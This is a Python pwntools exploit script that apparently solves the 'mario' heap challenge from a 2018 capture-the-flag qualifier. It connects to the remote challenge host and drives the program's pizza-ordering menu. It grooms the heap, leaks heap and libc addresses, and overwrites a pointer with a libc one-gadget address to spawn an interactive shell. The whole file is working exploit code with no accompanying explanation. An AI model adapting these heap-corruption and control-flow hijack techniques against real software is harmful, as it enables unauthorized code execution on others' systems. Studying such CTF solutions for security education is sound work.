from pwn import *
from conn_bby import solve_chal

pineapple = '\xF0\x9F\x8D\x8D'
tomato = '\xF0\x9F\x8D\x85'
chicken = '\xF0\x9F\x90\x94'
banana = '\xF0\x9F\x8D\x8C'
poop = '\xF0\x9F\x92\xA9'

def menu(p, choice):
    p.recvuntil('Choice: ')
    p.sendline(choice)

def new_customer(p, name):
    menu(p, 'N')
    p.recvuntil('name? ')
    p.sendline(name)

def login(p, name):
    menu(p, 'L')
    p.recvuntil('name? ')
    p.sendline(name)

def exit_program(p):
    menu(p, 'E')
    p.recvuntil('ciao!\n')

def order(p, orders):
    menu(p, 'O')
    p.recvuntil('pizzas? ')
    p.sendline(str(len(orders)))
    for i in orders:
        p.recvuntil('ingredients? ')
        p.sendline(str(len(i)))
        for j in i:
            p.recvuntil(': ')
            p.sendline(j)
            if j == pineapple:
                return
    p.recvuntil('thanks!\n')

def cook(p, message):
    menu(p, 'C')
    p.recvuntil('explain: ')
    p.sendline(message)

def admire(p):
    menu(p, 'A')

def leave(p):
    menu(p, 'L')

def please(p, msg):
    menu(p, 'P')
    p.recvuntil('yourself: ')
    p.sendline(msg)

def right(p):
    menu(p, 'Y')

def why(p):
    menu(p, 'W')

def add_options(p):
    p.menu = lambda choice: menu(p, choice)
    p.new_customer = lambda name: new_customer(p, name)
    p.login = lambda name: login(p, name)
    p.exit_program = lambda: exit_program(p)
    p.order = lambda orders: order(p, orders)
    p.cook = lambda message: cook(p, message)
    p.admire = lambda: admire(p)
    p.leave = lambda: leave(p)
    p.please = lambda msg: please(p, msg)
    p.right = lambda: right(p)
    p.why = lambda: why(p)

if __name__ == '__main__':
    context.binary = './mario'
    #context.log_level = 'DEBUG'
    libc = ELF("./libc.so.6", checksec = False)
    #libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    #p = context.binary.process()
    #p = process("LD_PRELOAD=./libc.so.6 ./mario", shell=True)
    p = remote("83b1db91.quals2018.oooverflow.io", 31337)
    solve_chal(p) # proof of work, remove for local
    #p = process("./linux_serverx64")
    add_options(p)

    # 'heap grooming'
    p.new_customer('bobby')
    p.leave()
    p.new_customer('sam')

    # make 16 pineapple pizzas, 1 tomato pizza
    ord = [['\xe0' + pineapple[:2], pineapple[2:]] for i in xrange(16)]
    ord.append([tomato])
    p.order(ord)

    # Cook pizzas to trigger pineapple bug, heap should be sort of groomed now
    p.cook('a'*0x47)

    # Leak heap address
    p.leave()
    p.why()
    p.recvuntil('had to say: ')
    heap_addr = u64(p.recvn(6) + '\x00\x00')
    log.info('Heap address: 0x%X' % heap_addr)
    #leak_addr = heap_addr - 0x350
    leak_addr = heap_addr + 280
    p.new_customer("killer" + "a" * 0x80)
    p.order([['\xe0' + pineapple[:2], pineapple[2:]]])
    p.leave()

    # add a couple padding customers to shape
    p.new_customer("pad1")
    p.leave()
    p.new_customer("pad2")
    p.leave()
    p.new_customer("pad3")
    p.leave()
    p.new_customer("pad4")
    p.leave()
    p.new_customer("pad5")
    p.leave()
    p.new_customer("pad6")
    p.leave()

    p.new_customer("breaker")
    p.order(ord)
    p.cook('a' * 0x30) # config me so this allocation is saved for next description
    p.leave()
    # now make new customer, hope it is placed directly after the description
    # groom to fill up heap
    for i in xrange(0, 1):
        p.new_customer("leaker" + str(i) + "a" * 0x100)
        p.leave()
    p.login("breaker")
    p.please(fit({0x110:p64(heap_addr+10704), 0x110 + 0x8:p64(heap_addr-1088), 0x110+0x10:p64(heap_addr-1064)}, filler="\x00"))
    p.login("leaker0" +"a" *0x100)
    p.cook('a' * 0x30)
    p.please('a' * 272 + p64(leak_addr))
    p.why()
    p.recvuntil("friend ")
    leaked_a = u64(p.recvn(6) + "\x00\x00")
    libc_base = leaked_a - libc.symbols["__malloc_hook"] - 104
    log.info("Leaked libc address: " + hex(leaked_a))
    log.info("Libc base: " + hex(libc_base))
    '''bin_addr = u64(p.recvn(6) + "\x00\x00")
    log.info("Leaked bin address: " + hex(bin_addr))
    bin_base = bin_addr - 0x20bbe0
    log.info("Binary base: " + hex(bin_base))'''

    # now we need to set up the heap so that a description pointer is right before some cooked pizzas
    p.new_customer("ben1")
    p.order(ord)
    p.cook("aaa")
    p.leave()
    p.new_customer("ben2")
    p.order([['\xe0' + pineapple[:2], pineapple[2:]]])
    p.cook("aaa")
    #p.please(cyclic(290))
    magic_addr = 0xf02a4
    p.please(fit({0:p64(libc_base + magic_addr), 112:p64(heap_addr + 0x3ad0)}, filler="\x00"))
    p.login("ben1")
    p.admire() # crash, yo

    p.interactive()
    
